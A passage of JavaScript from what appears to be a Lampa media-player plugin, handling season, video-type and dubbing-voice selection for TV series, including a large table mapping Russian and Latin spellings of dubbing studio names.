                if (voiceName && filter_find.voice.indexOf(voiceName) === -1) {
                  filter_find.voice.push(voiceName);
                }
              }
            }
          }
        }

        choice.seasons = filter_find.season.length;
        
        if (filter_find.type && filter_find.type.length > 0) {
          if (choice.type < 0 || choice.type >= filter_find.type.length) {
            var hdrIndex = filter_find.type.indexOf('HDR');
            if (hdrIndex !== -1) choice.type = hdrIndex;
            else choice.type = 0;
          }
        }

        // Проверяем доступность выбранного сезона в выбранном типе
        if (filter_find.type && filter_find.type.length > 0 && items && choice.season >= 0) {
          var selectedType = filter_find.type[choice.type] || 'HDR';
          var isTypeBasedStructure = extract && extract.type && extract.type.length > 0;
          
          if (isTypeBasedStructure && items[selectedType] && filter_find.season && filter_find.season.length) {
            var selectedSeasonObj = choice.season >= 0 && choice.season < filter_find.season.length
              ? filter_find.season[choice.season]
              : null;
            var seasonNumber = selectedSeasonObj == null ? null :
              (typeof selectedSeasonObj === 'object'
                ? (selectedSeasonObj.title || selectedSeasonObj.name || '').split(' ').pop()
                : String(selectedSeasonObj).split(' ').pop());

            // Если выбранный сезон недоступен в этом типе
            if (seasonNumber && !items[selectedType][seasonNumber]) {
              var availableSeasons = Lampa.Arrays.getKeys(items[selectedType]);
              if (availableSeasons.length > 0) {
                // Ищем индекс первого доступного сезона в filter_find.season
                for (var i = 0; i < filter_find.season.length; i++) {
                  var checkSeasonObj = filter_find.season[i];
                  if (checkSeasonObj == null) continue;
                  var checkSeasonNumber = typeof checkSeasonObj === 'object'
                    ? (checkSeasonObj.title || checkSeasonObj.name || '').split(' ').pop()
                    : String(checkSeasonObj).split(' ').pop();

                  if (checkSeasonNumber && items[selectedType][checkSeasonNumber]) {
                    choice.season = i;
                    break;
                  }
                }
              }
            }
          }
        }
        
        this.replaceChoice(choice);


        if (extract.voice && typeof extract.voice[0] == 'object') filter_find.voice = extract.voice;
        if (season) {
          var foundVoice = -1;
          var currentSeason = season.split(' ').pop();

          if (items && Lampa.Arrays.getKeys(items).length > 0 && !isNaN(Lampa.Arrays.getKeys(items)[0])) {
            if (select_voice && filter_find.voice && filter_find.voice.length) {
              foundVoice = _this.findBestVoiceMatch(select_voice, filter_find.voice);
            }

            if (foundVoice === -1 && choice.voice_id && filter_find.voice) {
              for (var i = 0; i < filter_find.voice.length; i++) {
                var v = filter_find.voice[i];
                if (typeof v === 'object' && v.id == choice.voice_id) {
                  foundVoice = i;
                  break;
                }
              }
            }

            if (foundVoice === -1 && choice.voice < filter_find.voice.length) foundVoice = choice.voice;
            if (foundVoice === -1) foundVoice = 0;

            choice.voice = foundVoice;
            if (typeof filter_find.voice[foundVoice] === 'object') {
              choice.voice_id = filter_find.voice[foundVoice].id;
              choice.voice_name = filter_find.voice[foundVoice].title || filter_find.voice[foundVoice].name;
            }

            voice = filter_find.voice[foundVoice];
          } else {
            var availableVoices = [];
            if (items) {
              for (var name in items) {
                if (items.hasOwnProperty(name) &&
                  items[name] &&
                  items[name][currentSeason] &&
                  Lampa.Arrays.isArray(items[name][currentSeason]) &&
                  items[name][currentSeason].length > 0 &&
                  items[name][currentSeason][0] &&
                  items[name][currentSeason][0].voice_name) {
                  var voiceName = items[name][currentSeason][0].voice_name;
                  if (availableVoices.indexOf(voiceName) === -1) {
                    availableVoices.push(voiceName);
                  }
                }
              }
            }
            var hasSelectVoice = false;
            if (select_voice) {
              // Сначала проверяем точное совпадение
              for (var j = 0; j < availableVoices.length; j++) {
                if (_this.equalTitle(select_voice, availableVoices[j])) {
                  hasSelectVoice = true;
                  break;
                }
              }
              // Если точное совпадение не найдено, проверяем частичное
              if (!hasSelectVoice) {
                for (var j = 0; j < availableVoices.length; j++) {
                  if (_this.compareVoiceNames(select_voice, availableVoices[j])) {
                    hasSelectVoice = true;
                    break;
                  }
                }
              }
            }

            if (select_voice && hasSelectVoice) {
              foundVoice = _this.findBestVoiceMatch(select_voice, filter_find.voice);
            }

            if (foundVoice === -1 && choice.voice < filter_find.voice.length) {
              var choiceVoiceName = filter_find.voice[choice.voice];
              if (typeof choiceVoiceName === 'object') {
                choiceVoiceName = choiceVoiceName.title || choiceVoiceName.name;
              }

              var hasChoiceVoice = false;
              if (choiceVoiceName) {
                // Сначала проверяем точное совпадение
                for (var k = 0; k < availableVoices.length; k++) {
                  if (_this.equalTitle(choiceVoiceName, availableVoices[k])) {
                    hasChoiceVoice = true;
                    break;
                  }
                }
                // Если точное совпадение не найдено, проверяем частичное
                if (!hasChoiceVoice) {
                  for (var k = 0; k < availableVoices.length; k++) {
                    if (_this.compareVoiceNames(choiceVoiceName, availableVoices[k])) {
                      hasChoiceVoice = true;
                      break;
                    }
                  }
                }
              }

              if (hasChoiceVoice) foundVoice = choice.voice;
            }
            if (foundVoice === -1) foundVoice = 0;

            if (availableVoices.length) choice.voice = foundVoice;

            voice = (filter_find.voice[choice.voice] && (filter_find.voice[choice.voice].name || filter_find.voice[choice.voice].title)) || filter_find.voice[choice.voice];
          }

          find_s = extract.season.find(function (s) {
            return (s.name || s.title) == season;
          });

          if (typeof voice === 'object') {
            find_v = voice;
          } else {
            find_v = (extract.voice && extract.voice || filter_find.voice).find(function (v) {
              return (v.name || v.title) == voice;
            });
          }

          if (!voice && filter_find.voice.length) {
            voice = filter_find.voice[0] && (filter_find.voice[0].name || filter_find.voice[0].title) || find_v;
            choice.voice = 0;
          }
        }

        if (extract && extract.season && extract.season.length && typeof extract.season[0] !== 'object' && season === Lampa.Lang.translate('all_seasons')) {
          var allSeasons = filter_find.season.filter(function (s) {
            return s !== Lampa.Lang.translate('all_seasons');
          }).map(function (s) {
            return typeof s === 'string' ? s.split(' ').pop() : String(s);
          });

          // Проверяем есть ли типы видео в extract
          var isTypeBasedStructure = extract && extract.type && extract.type.length > 0;

          if (isTypeBasedStructure) {
            // Новая структура folder[type][season][] - фильтруем по типу
            finalItems = [];
            var selectedType = this.selectVideoType(filter_find, choice);
            this.replaceChoice(choice);
            
            if (items[selectedType]) {
              // Сначала находим какие сезоны доступны в выбранном типе
              var availableSeasonsInType = [];
              for (var i = 0; i < allSeasons.length; i++) {
                var s = allSeasons[i];
                if (items[selectedType][s] && Lampa.Arrays.isArray(items[selectedType][s]) && items[selectedType][s].length > 0) {
                  availableSeasonsInType.push(s);
                }
              }
              
              // Если нет доступных сезонов в выбранном типе, берем все доступные сезоны из этого типа
              if (availableSeasonsInType.length === 0) {
                var allAvailableSeasons = Lampa.Arrays.getKeys(items[selectedType]);
                availableSeasonsInType = allAvailableSeasons.filter(function(season) {
                  return items[selectedType][season] && Lampa.Arrays.isArray(items[selectedType][season]) && items[selectedType][season].length > 0;
                });
              }
              
              // Теперь собираем эпизоды из доступных сезонов
              for (var i = 0; i < availableSeasonsInType.length; i++) {
                var s = availableSeasonsInType[i];
                for (var j = 0; j < items[selectedType][s].length; j++) {
                  var item = items[selectedType][s][j];
                  item.season = parseInt(s);
                  finalItems.push(item);
                }
              }
            }
            finalItems = finalItems.sort(function (a, b) {
              if (a.season === b.season) return a.episode - b.episode;
              return a.season - b.season;
            });
          } else {
            if (!filter_find.voice.length || filter_find.voice.length === 0) {
              // Нет озвучек - обрабатываем items напрямую по сезонам
              finalItems = [];
              for (var i = 0; i < allSeasons.length; i++) {
                var s = allSeasons[i];
                if (items[s] && Lampa.Arrays.isArray(items[s])) {
                  for (var j = 0; j < items[s].length; j++) {
                    var item = items[s][j];
                    item.season = parseInt(s);
                    finalItems.push(item);
                  }
                }
              }
              finalItems = finalItems.sort(function (a, b) {
                if (a.season === b.season) return a.episode - b.episode;
                return a.season - b.season;
              });
            } else {
              // Есть озвучки - используем стандартную логику
              var selectedVoice = select_voice || choice.voice_name || voice;
              var selectedVoiceId = choice.voice_id;

              if (!selectedVoice && selectedVoiceId && filter_find.voice) {
                for (var i = 0; i < filter_find.voice.length; i++) {
                  var v = filter_find.voice[i];
                  if (typeof v === 'object' && v.id == selectedVoiceId) {
                    selectedVoice = v.title || v.name;
                    break;
                  }
                }
              }
              var res = this.collectEpisodesAllSeasons(items, allSeasons, selectedVoice, filter_find.voice, selectedVoiceId);
              finalItems = res.finalItems;
              choice.voice = res.voiceIndex;

              finalItems = finalItems.sort(function (a, b) {
                if (a.season === b.season) return a.episode - b.episode;
                return a.season - b.season;
              });
            }
          }
        } else if (season) {
          // Используем исправленный choice.season вместо названия сезона
          var seasonObj = filter_find.season[choice.season];
          var seasonNumber = typeof seasonObj === 'object' ? 
            (seasonObj.title || seasonObj.name || '').split(' ').pop() : 
            (seasonObj || '').split(' ').pop();
          

          // Проверяем есть ли типы видео в extract
          var folderKeys = Lampa.Arrays.getKeys(items);
          var isTypeBasedStructure = extract && extract.type && extract.type.length > 0;
          
          var isDirectSeasonMapping = folderKeys.length > 0 && folderKeys.every(function (key) {
            return !isNaN(key) && Lampa.Arrays.isArray(items[key]);
          });

          // Если выбранного сезона нет в доступных данных, берем первый доступный
          if (isDirectSeasonMapping && !items[seasonNumber]) {
            var availableSeasons = folderKeys.filter(function(key) {
              return items[key] && items[key].length > 0;
            });
            if (availableSeasons.length > 0) {
              seasonNumber = availableSeasons[0];
              // Обновляем choice.season на индекс первого доступного сезона
              for (var i = 0; i < filter_find.season.length; i++) {
                var checkSeasonObj = filter_find.season[i];
                var checkSeasonNum = typeof checkSeasonObj === 'object' ? 
                  (checkSeasonObj.title || checkSeasonObj.name || '').split(' ').pop() : 
                  (checkSeasonObj || '').split(' ').pop();
                if (checkSeasonNum === seasonNumber) {
                  choice.season = i;
                  this.replaceChoice(choice);
                  break;
                }
              }
            }
          }

          if (isTypeBasedStructure) {
            // Новая структура folder[type][season][] - фильтруем по типу
            finalItems = [];
            var selectedType = this.selectVideoType(filter_find, choice);
            this.replaceChoice(choice);
            
            if (items[selectedType]) {
              var actualSeasonNumber = seasonNumber;
              
              // Если выбранного сезона нет в этом типе, найдем первый доступный
              if (!items[selectedType][seasonNumber]) {
                var availableSeasons = Lampa.Arrays.getKeys(items[selectedType]);
                if (availableSeasons.length > 0) {
                  actualSeasonNumber = availableSeasons[0];
                }
              }
              
              if (items[selectedType][actualSeasonNumber]) {
                finalItems = items[selectedType][actualSeasonNumber] || [];
                finalItems.forEach(function (item) {
                  item.season = parseInt(actualSeasonNumber);
                });
              }
            }
          } else if (isDirectSeasonMapping) {
            // Структура items[season_number] - фильтруем по voice_id если есть
            finalItems = items[seasonNumber] || [];
            
            // Фильтруем по voice_id если он есть в choice и если в эпизодах есть voice_id
            if (finalItems.length && choice.voice_id && finalItems[0] && finalItems[0].voice_id) {
              finalItems = finalItems.filter(function (item) {
                return item.voice_id == choice.voice_id;
              });
            }
            if (finalItems.length) {
              finalItems.forEach(function (item) {
                item.season = parseInt(seasonNumber);
              });
            }
          } else if (voice) {
            // Стандартная структура с озвучками
            if ((Lampa.Arrays.getKeys(items)[1] ? !isNaN(Lampa.Arrays.getKeys(items)[1]) : !isNaN(Lampa.Arrays.getKeys(items)[0]))) {
              finalItems = items[seasonNumber] ? items[seasonNumber].filter(function (itm) {
                itm.info = voice;
                var voiceId = find_v ? find_v.id : choice.voice_id;
                return voiceId && itm.voice_id == voiceId && itm.season == seasonNumber;
              }) : [];
            } else {
              var find = items[voice] && items[voice][seasonNumber];
              if (!find && !extract.season[0].url && balanser !== 'hdrezka') {
                filter_find.season = [];
                if (items[voice]) {
                  Lampa.Arrays.getKeys(items[voice]).forEach(function (s) {
                    filter_find.season.push(Lampa.Lang.translate('torrent_serial_season') + ' ' + s);
                  });
                }
              }

              if (!find && find_s && find_s.url) {
                this.request(this.requestParams(find_s.url));
              } else {
                var other = items[voice] && Lampa.Arrays.getKeys(items[voice])[0] && items[voice][Lampa.Arrays.getKeys(items[voice])[0]];
                finalItems = find ? find : (other || []);
              }
            }
          } else {
            // Нет голоса, пытаемся взять напрямую по сезону
            finalItems = items[seasonNumber] || items;
          }
        }

        if (find_v && find_v.url && filter_find.season.length && Lampa.Arrays.getKeys(filter_find.voice).length && Lampa.Arrays.getKeys(items).length && !finalItems.length) {
          this.request(this.requestParams(find_v.url));
        } else if (find_s && find_s.url && filter_find.season.length && Lampa.Arrays.getKeys(items).length && !finalItems) {
          this.request(this.requestParams(find_s.url));
        } else if (finalItems && finalItems.length) {
          this.display(!choice.order ? finalItems : finalItems.reverse());
        } else if (!Lampa.Arrays.getKeys(items).length) this.empty();
      }
    } catch (e) {
      console.log('Modss', 'parse error', e);
      Lampa.Noty.show('MODSs ОШИБКА ОНЛАЙН parse -> ' + e);
      this.doesNotAnswer();
      this.activity.loader(false);
    }
  };
  this.selectVideoType = function (filter_find, choice) {
    var selectedType = null;
    var selectedIndex = 0;
    
    if (filter_find.type && filter_find.type.length > 0) {
      // Проверяем что choice.type не пустая строка и является корректным индексом
      var typeIndex = parseInt(choice.type);
      if (!isNaN(typeIndex) && typeIndex >= 0 && typeIndex < filter_find.type.length) {
        selectedType = filter_find.type[typeIndex];
        selectedIndex = typeIndex;
      }
      else if (filter_find.type.indexOf('HDR') !== -1) {
        selectedIndex = filter_find.type.indexOf('HDR');
        selectedType = 'HDR';
      }
      else {
        selectedIndex = 0;
        selectedType = filter_find.type[0];
      }
      
      // Сохраняем выбранный индекс типа в choice
      choice.type = selectedIndex;
    }
    
    return selectedType;
  };
  this.getAvailableVoicesForSeason = function (folder, s) {
    var voices = [];

    // Проверяем, является ли структура folder прямым маппингом сезонов
    var folderKeys = Lampa.Arrays.getKeys(folder);
    var isDirectSeasonMapping = folderKeys.length > 0 && folderKeys.every(function (key) {
      return !isNaN(key) && Lampa.Arrays.isArray(folder[key]);
    });

    if (isDirectSeasonMapping) {
      // Структура folder[season_number] - нет озвучек
      return [];
    } else {
      // Стандартная структура folder[voice_name][season_number]
      for (var name in folder) {
        if (
          folder[name] &&
          folder[name][s] &&
          folder[name][s].length &&
          folder[name][s][0].voice_name
        ) {
          var v = folder[name][s][0].voice_name;
          if (voices.indexOf(v) === -1) voices.push(v);
        }
      }
    }
    return voices;
  };
  this.getEpisodesByVoice = function (folder, s, voiceName, voiceId) {
    var folderKeys = Lampa.Arrays.getKeys(folder);
    var isDirectSeasonMapping = folderKeys.length > 0 && folderKeys.every(function (key) {
      return !isNaN(key) && Lampa.Arrays.isArray(folder[key]);
    });

    if (isDirectSeasonMapping) {
      if (folder[s] && Lampa.Arrays.isArray(folder[s])) {
        var episodes = folder[s];
        if (voiceId) {
          episodes = episodes.filter(function (item) {
            return item.voice_id == voiceId;
          });
        }
        var mappedEpisodes = episodes.map(function (item) {
          item.season = parseInt(s);
          return item;
        });
        return mappedEpisodes;
      }
      return [];
    } else {
      var availableVoices = [];
      var folderKeys = [];

      for (var name in folder) {
        if (
          folder[name] &&
          folder[name][s] &&
          folder[name][s].length &&
          folder[name][s][0].voice_name
        ) {
          availableVoices.push(folder[name][s][0].voice_name);
          folderKeys.push(name);
        }
      }
      var bestIndex = this.findBestVoiceMatch(voiceName, availableVoices);

      if (bestIndex !== -1) {
        var folderKey = folderKeys[bestIndex];
        return folder[folderKey][s].map(function (item) {
          item.season = parseInt(s);
          return item;
        });
      }

      return [];
    }
  };
  this.collectEpisodesAllSeasons = function (folder, allSeasons, select_voice, voiceList, selectedVoiceId) {

    var finalItems = [];
    var foundVoice = false;
    var voiceIndex = 0;

    var folderKeys = Lampa.Arrays.getKeys(folder);
    var isDirectSeasonMapping = folderKeys.length > 0 && folderKeys.every(function (key) {
      return !isNaN(key) && Lampa.Arrays.isArray(folder[key]);
    });

    if (isDirectSeasonMapping) {
      if (selectedVoiceId) {
        for (var i = 0; i < allSeasons.length; i++) {
          var s = allSeasons[i];
          if (folder[s] && Lampa.Arrays.isArray(folder[s])) {
            for (var j = 0; j < folder[s].length; j++) {
              var item = folder[s][j];
              if (item.voice_id == selectedVoiceId) {
                item.season = parseInt(s);
                finalItems.push(item);
              }
            }
          }
        }

        var voiceIndexInList = this.findVoiceIndexById(selectedVoiceId, voiceList);
        return { finalItems: finalItems, voiceIndex: voiceIndexInList !== -1 ? voiceIndexInList : 0 };
      }

      var availableVoices = [];
      for (var i = 0; i < allSeasons.length; i++) {
        var s = allSeasons[i];
        if (folder[s] && Lampa.Arrays.isArray(folder[s])) {
          for (var j = 0; j < folder[s].length; j++) {
            var item = folder[s][j];
            if (item.voice_name && availableVoices.indexOf(item.voice_name) === -1) {
              availableVoices.push(item.voice_name);
            }
          }
        }
      }

      if (availableVoices.length > 0) {
        var firstVoice = availableVoices[0];
        for (var i = 0; i < allSeasons.length; i++) {
          var s = allSeasons[i];
          if (folder[s] && Lampa.Arrays.isArray(folder[s])) {
            for (var j = 0; j < folder[s].length; j++) {
              var item = folder[s][j];
              if (item.voice_name === firstVoice) {
                item.season = parseInt(s);
                finalItems.push(item);
              }
            }
          }
        }
      }
      return { finalItems: finalItems, voiceIndex: 0 };
    } else {
      if (select_voice) {
        var selectedVoiceId = this.findVoiceIdByName(select_voice, voiceList);

        for (var i = 0; i < allSeasons.length; i++) {
          var s = allSeasons[i];
          var episodes = this.getEpisodesByVoice(folder, s, select_voice, selectedVoiceId);
          if (episodes.length) {
            for (var j = 0; j < episodes.length; j++) finalItems.push(episodes[j]);
            foundVoice = true;
          }
        }
        if (foundVoice && voiceList.length) {
          var idx = this.findBestVoiceMatch(select_voice, voiceList);
          voiceIndex = idx !== -1 ? idx : 0;
        }
      }
      if (!foundVoice && voiceList.length) {
        var firstVoice = this.getVoiceName(voiceList[0]);
        var firstVoiceId = typeof voiceList[0] === 'object' ? voiceList[0].id : null;
        for (var i = 0; i < allSeasons.length; i++) {
          var s = allSeasons[i];
          var episodes = this.getEpisodesByVoice(folder, s, firstVoice, firstVoiceId);
          if (episodes.length) {
            for (var j = 0; j < episodes.length; j++) finalItems.push(episodes[j]);
          }
        }
        voiceIndex = 0;
      }
      return { finalItems: finalItems, voiceIndex: voiceIndex };
    }
  };
  this.equalTitle = function (t1, t2) {
    return typeof t1 === 'string' && typeof t2 === 'string' && t1.toLowerCase().trim() === t2.toLowerCase().trim();
  };
  this.extractVoiceKeywords = function (voiceName) {
    if (!voiceName) return [];

    var lower = voiceName.toLowerCase();
    lower = lower.replace(/^(mvo|dub|dvo)\s*\|\s*/i, '');
    lower = lower.replace(/^\([a-z]{2,3}\)\s*/i, '');

    var brackets = [];
    var bracketsMatch = lower.match(/[\[\(]([^\]\)]+)[\]\)]/g);
    if (bracketsMatch) {
      bracketsMatch.forEach(function (match) {
        var content = match.replace(/[\[\(\]\)]/g, '');
        brackets.push(content);
      });
    }

    var mainText = lower.replace(/[\[\(][^\]\)]*[\]\)]/g, '').trim();

    var words = mainText.split(/\s+/).filter(function (word) {
      return word.length > 0;
    });

    brackets.forEach(function (bracket) {
      var bracketWords = bracket.split(/[,\s]+/).filter(function (word) {
        return word.length > 0;
      });
      words = words.concat(bracketWords);
    });

    var voiceVariants = {
      'netflix': ['netflix', 'нетфликс'],
      'hbo': ['hbo', 'хбо'],
      'disney': ['disney', 'дисней'],
      'amazon': ['amazon', 'амазон'],
      'rus': ['rus', 'рус', 'russian'],
      'ukr': ['ukr', 'укр', 'ukrainian'],
      'eng': ['eng', 'англ', 'english'],
      'lostfilm': ['lostfilm', 'лостфильм'],
      'hdrezka': ['hdrezka', 'хдрезка'],
      'coldfilm': ['coldfilm', 'колдфильм'],
      'ultradox': ['ultradox', 'ультрадокс'],
      'softbox': ['softbox', 'софтбокс'],
      'tvshows': ['tvshows', 'тв шоуз'],
      'videofilm': ['videofilm', 'видеофильм'],
      'animaunt': ['animaunt', 'анимаунт'],
      'rudub': ['rudub', 'рудаб'],
      'nova': ['nova', 'нова'],
      'dubляж': ['dubляж', 'дубляж'],
      '1winstudio': ['1winstudio', '1вин студио', '1win Studio', '1WINStudio', '1winstudio', '1win', '1вин', '1win studio'],
      'закадры': ['закадры', 'zakadry'],
      'shelby': ['shelby', 'шелби'],
      'skyline': ['skyline', 'скайлайн'],
      'dragon': ['dragon', 'драгон'],
      'money': ['money', 'мани'],
      'studio': ['studio', 'студио'],
      'head': ['head', 'хэд'],
      'sound': ['sound', 'саунд'],
      'red': ['red', 'ред'],
      'ltd': ['ltd', 'лтд'],
      'кашкин': ['кашкин', 'kashkin'],
      'vulpes': ['vulpes', 'вулпес'],
      'kerob': ['kerob', 'кероб'],
      'питерский': ['питерский', 'pitersky'],
      'фильмэкспорт': ['фильмэкспорт', 'filmexport'],
      'clubfate': ['clubfate', 'клабфейт'],
      'ideafilm': ['ideafilm', 'идеяфильм'],
      'pashaup': ['pashaup', 'пашаап'],
      'живов': ['живов', 'zhivov'],
      'rizz': ['rizz', 'ризз'],
      'fisher': ['fisher', 'фишер'],
      'инфо': ['инфо', 'info'],
      'киномания': ['киномания', 'kinomania'],
      'smallfilm': ['smallfilm', 'смолфильм'],
      'кузьмичёв': ['кузьмичёв', 'kuzmichev'],
      'дроздов': ['дроздов', 'drozdov'],
      'nice': ['nice', 'найс'],
      'media': ['media', 'медиа'],
      'интер': ['интер', 'inter'],
      'лебедев': ['лебедев', 'lebedev'],
      'мосфильм': ['мосфильм', 'mosfilm'],
      'greb': ['greb', 'греб'],
      'creative': ['creative', 'креативе'],
      'hellomickey': ['hellomickey', 'хэллоумикки'],
      'production': ['production', 'продакшн'],
      'zone': ['zone', 'зона'],
      'vision': ['vision', 'вижн'],
      'завгородний': ['завгородний', 'zavgorodny'],
      'строев': ['строев', 'stroev'],
      'elrom': ['elrom', 'элром'],
      'elegia': ['elegia', 'элегия'],
      'гланц': ['гланц', 'glanz'],
      'петербургский': ['петербургский', 'petersburg'],
      'бибиков': ['бибиков', 'bibikov'],
      'витя': ['витя', 'vitya'],
      'говорун': ['говорун', 'govorun'],
      'медведев': ['медведев', 'medvedev'],
      'анубис': ['анубис', 'anubis'],
      'omskbird': ['omskbird', 'омскберд'],
      'яковлев': ['яковлев', 'yakovlev'],
      'firedub': ['firedub', 'файрдаб'],
      'fdv': ['fdv', 'фдв'],
      'galvid': ['galvid', 'галвид'],
      'белов': ['белов', 'belov'],
      'нурмухаметов': ['нурмухаметов', 'nurmuhametov'],
      'liga': ['liga', 'лига'],
      'hq': ['hq', 'хк'],
      'skyefilmtv': ['skyefilmtv', 'скайфильмтв'],
      'victoryfilms': ['victoryfilms', 'викториафильмс'],
      'sony': ['sony', 'сони'],
      'channel': ['channel', 'канал'],
      'jetix': ['jetix', 'джетикс'],
      'apofysteam': ['apofysteam', 'апофис'],
      'fox': ['fox', 'фокс'],
      'russia': ['russia', 'россия'],
      'премьер': ['премьер', 'premier'],
      'мультимедиа': ['мультимедиа', 'multimedia'],
      'tv1000': ['tv1000', 'тв1000'],
      'иддк': ['иддк', 'iddk'],
      'gremlin': ['gremlin', 'гремлин'],
      'анвад': ['анвад', 'anvad'],
      'кура': ['кура', 'kura'],
      'arasi': ['arasi', 'арази'],
      'project': ['project', 'проект'],
      'tatamifilm': ['tatamifilm', 'татамифильм'],
      'zerzia': ['zerzia', 'зерзия'],
      'векшин': ['векшин', 'vekshin'],
      'bonsai': ['bonsai', 'бонсай'],
      'foxlife': ['foxlife', 'фоксляйф'],
      'new': ['new', 'нью'],
      'records': ['records', 'рекордс'],
      'визгунов': ['визгунов', 'vizgunov'],
      'videobiz': ['videobiz', 'видеобиз'],
      'филонов': ['филонов', 'filonov'],
      'поздняков': ['поздняков', 'pozdnyakov'],
      'lexikc': ['lexikc', 'лексик'],
      'viasat': ['viasat', 'виасат'],
      'history': ['history', 'хистори'],
      'ошурков': ['ошурков', 'oshurkov'],
      'ivi': ['ivi', 'иви'],
      'васька': ['васька', 'vaska'],
      'куролесов': ['куролесов', 'kurolesov'],
      'кураж': ['кураж', 'kurazh'],
      'бамбей': ['бамбей', 'bambey'],
      'леша': ['леша', 'lesha'],
      'прапорщик': ['прапорщик', 'praporschik'],
      'cbs': ['cbs', 'цбс'],
      'drama': ['drama', 'драма'],
      'studioband': ['studioband', 'студиобанд'],
      'велес': ['велес', 'veles'],
      'дьяков': ['дьяков', 'dyakov'],
      'щегольков': ['щегольков', 'schegolkov'],
      'paravozik': ['paravozik', 'паравозик'],
      'animespace': ['animespace', 'анимеспейс'],
      'team': ['team', 'тим'],
      'east': ['east', 'ист'],
      'dream': ['dream', 'дрим'],
      'xdub': ['xdub', 'иксдаб'],
      'dorama': ['dorama', 'дорама'],
      'колобок': ['колобок', 'kolobok'],
      'четыре': ['четыре', 'chetyre'],
      'квадрате': ['квадрате', 'kvadrate'],
      'vip': ['vip', 'вип'],
      'premiere': ['premiere', 'премьера'],
      'agatha': ['agatha', 'агата'],
      'studdio': ['studdio', 'студдио'],
      'uaflix': ['uaflix', 'уафлукс'],
      'laci': ['laci', 'лаци'],
      'дубровин': ['дубровин', 'dubrovin'],
      'zee': ['zee', 'зи'],
      'tv': ['tv', 'тв'],
      'cinema': ['cinema', 'кинема'],
      'prestige': ['prestige', 'престиж'],
      'explorer': ['explorer', 'эксплорер'],
      '1001': ['1001', '1001'],
      'axn': ['axn', 'аксн'],
      'sci': ['sci', 'сай'],
      'fi': ['fi', 'фай'],
      'набиев': ['набиев', 'nabiev'],
      'петербуржец': ['петербуржец', 'peterburzhec'],
      'lupin': ['lupin', 'лупин'],
      'koleso': ['koleso', 'колесо'],
      'gezell': ['gezell', 'гезелл'],
      'хихидок': ['хихидок', 'hihidok'],
      'сокуров': ['сокуров', 'sokurov'],
      'так': ['так', 'tak'],
      'треба': ['треба', 'treba'],
      'пучков': ['пучков', 'puchkov'],
      'точка': ['точка', 'tochka'],
      'zрения': ['zрения', 'zreniya'],
      'arisu': ['arisu', 'арису'],
      'anyfilm': ['anyfilm', 'энифильм'],
      'parovoz': ['parovoz', 'паровоз'],
      'kerems13': ['kerems13', 'керемс13'],
      'aurafilm': ['aurafilm', 'аурафильм'],
      'ртр': ['ртр', 'rtr'],
      'зебуро': ['зебуро', 'zeburo'],
      'onibaku': ['onibaku', 'онибаку'],
      'neon': ['neon', 'неон'],
      'mtv': ['mtv', 'мтв'],
      'мьюзик': ['мьюзик', 'music'],
      'трейд': ['трейд', 'trade'],
      'шадинский': ['шадинский', 'shadinsky'],
      'килька': ['килька', 'kilka'],
      'solod': ['solod', 'солод'],
      'bravesound': ['bravesound', 'брейвсаунд'],
      'гуртом': ['гуртом', 'gurtom'],
      'victeam': ['victeam', 'виктим'],
      'mixfilm': ['mixfilm', 'миксфильм'],
      'extrabit': ['extrabit', 'экстрабит'],
      'стартрек': ['стартрек', 'startrek'],
      'brain': ['brain', 'брейн'],
      'ктк': ['ктк', 'ktk'],
      'морозов': ['морозов', 'morozov'],
      'cls': ['cls', 'клс'],
      'horizon': ['horizon', 'хоризон'],
      'max': ['max', 'макс'],
      'nabokov': ['nabokov', 'набоков'],
      'rumble': ['rumble', 'рамбл'],
      'толмачев': ['толмачев', 'tolmachev'],
      'imageart': ['imageart', 'имеджарт'],
      'нст': ['нст', 'nst'],
      'bd': ['bd', 'бд'],
      'cee': ['cee', 'си'],
      'tf': ['tf', 'тф'],
      'anigroup': ['anigroup', 'анигруп'],
      'видеосервис': ['видеосервис', 'videoservice'],
      'opendub': ['opendub', 'опендаб'],
      'st': ['st', 'ст'],
      'удивительные': ['удивительные', 'wonderful'],
      'приключения': ['приключения', 'adventures'],
      'сериалы': ['сериалы', 'series'],
      'фильмы': ['фильмы', 'films'],
      'мультфильмы': ['мультфильмы', 'cartoons'],
      'дорамы': ['дорамы', 'doramas'],
      'аниме': ['аниме', 'anime'],
      'оригинал': ['оригинал', 'original'],
      'перевод': ['перевод', 'translation'],
      'субтитры': ['субтитры', 'subtitles'],
      'озвучка': ['озвучка', 'dubbing'],
      'многоголосый': ['многоголосый', 'multivoice'],
      'закадровый': ['закадровый', 'voiceover']
    };

    var normalized = words.map(function (word) {
      word = word.replace(/[,\.\-_]/g, '').trim();
      for (var key in voiceVariants) {
        if (voiceVariants[key].indexOf(word) !== -1) return key;
      }

      return word;
    });

    return normalized.filter(function (word) {
      return word.length > 0;
    });
  };
  this.normalizeVoiceName = function (voiceName) {
    if (!voiceName) return '';

    // Убеждаемся что voiceName это строка
    var normalized = typeof voiceName === 'string' ? voiceName : String(voiceName);

    normalized = normalized.replace(/^(MVO|DUB|DVO|VO)\s*\|\s*/i, '');
    normalized = normalized.replace(/^\([A-Z]{2,3}\)\s*/i, '');
    normalized = normalized.replace(/\s*[&|+,]\s*/g, ' | ');
    normalized = normalized.replace(/studio\s+band/gi, 'studioband');
    normalized = normalized.replace(/\s*\|\s*/g, ' | ');
    normalized = normalized.replace(/\s+/g, ' ').trim();

    return normalized.toLowerCase();
  };
  this.compareVoiceNames = function (voiceName1, voiceName2) {
    if (!voiceName1 || !voiceName2) return false;
    if (this.equalTitle(voiceName1, voiceName2)) return true;

    var normalized1 = this.normalizeVoiceName(voiceName1);
    var normalized2 = this.normalizeVoiceName(voiceName2);
    if (normalized1 === normalized2) return true;

    var voice1Lower = voiceName1.toLowerCase().trim();
    var voice2Lower = voiceName2.toLowerCase().trim();

    var minLength = Math.min(voice1Lower.length, voice2Lower.length);
    var maxLength = Math.max(voice1Lower.length, voice2Lower.length);

    if (minLength >= 3 && (maxLength - minLength) / maxLength > 0.3) {
      if (voice1Lower.indexOf(voice2Lower) !== -1 || voice2Lower.indexOf(voice1Lower) !== -1) return true;
      if (normalized1.indexOf(normalized2) !== -1 || normalized2.indexOf(normalized1) !== -1) return true;
    }

    var keywords1 = this.extractVoiceKeywords(voiceName1);
    var keywords2 = this.extractVoiceKeywords(voiceName2);

    if (keywords1.length === 0 || keywords2.length === 0) return false;

    var matches = 0;
    var totalKeywords = Math.min(keywords1.length, keywords2.length);

    keywords1.forEach(function (keyword1) {
      keywords2.forEach(function (keyword2) {
        if (keyword1 === keyword2) matches++;
      });
    });

    var hasCommonWords1 = false;
    var hasCommonWords2 = false;
